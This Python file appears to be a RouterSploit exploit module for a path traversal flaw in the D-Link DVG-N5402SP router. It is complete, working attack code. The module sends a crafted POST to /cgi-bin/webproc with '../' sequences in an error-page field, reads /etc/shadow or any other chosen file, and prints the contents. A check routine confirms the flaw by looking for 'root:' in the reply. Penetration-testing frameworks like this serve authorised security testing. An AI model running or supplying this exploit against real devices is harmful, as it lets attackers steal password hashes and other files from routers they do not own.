from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DVG-N5402SP path traversal vulnerability.
    If the target is vulnerable it allows to read files from the device."
    """
    __info__ = {
        'name': 'D-Link DVG-N5402SP Path Traversal',
        'description': 'Module exploits D-Link DVG-N5402SP path traversal vulnerability, which allows reading files form the device',
        'authors': [
            'Karn Ganeshen',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/39409/',
            'http://ipositivesecurity.blogspot.com/2016/02/dlink-dvgn5402sp-multiple-vuln.html',
        ],
        'devices': [
            'D-Link DVG-N5402SP',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(8080, 'Target port')  # default port
    filename = exploits.Option('/etc/shadow', 'File to read')  # file to read

    def run(self):
        # address and parameters
        url = "{}:{}/cgi-bin/webproc".format(self.target, self.port)
        data = {
            "getpage": "html/index.html",
            "*errorpage*": "../../../../../../../../../../..{}".format(self.filename),
            "var%3Amenu": "setup",
            "var%3Apage": "connected",
            "var%": "",
            "objaction": "auth",
            "%3Ausername": "blah",
            "%3Apassword": "blah",
            "%3Aaction": "login",
            "%3Asessionid": "abcdefgh"
        }

        # connection
        response = http_request(method="POST", url=url, data=data)
        if response is None:
            return

        if response.status_code == 200:
            print_success("Exploit success")
            print_status("File: {}".format(self.filename))
            print_info(response.text)
        else:
            print_error("Exploit failed")

    @mute
    def check(self):
        # address and parameters
        url = "{}:{}/cgi-bin/webproc".format(self.target, self.port)
        data = {
            "getpage": "html/index.html",
            "*errorpage*": "../../../../../../../../../../../etc/shadow",
            "var%3Amenu": "setup",
            "var%3Apage": "connected",
            "var%": "",
            "objaction": "auth",
            "%3Ausername": "blah",
            "%3Apassword": "blah",
            "%3Aaction": "login",
            "%3Asessionid": "abcdefgh"
        }

        # connection
        response = http_request(method="POST", url=url, data=data)

        if response is not None and "root:" in response.text:
            return True  # target vulnerable

        return False  # target not vulnerable
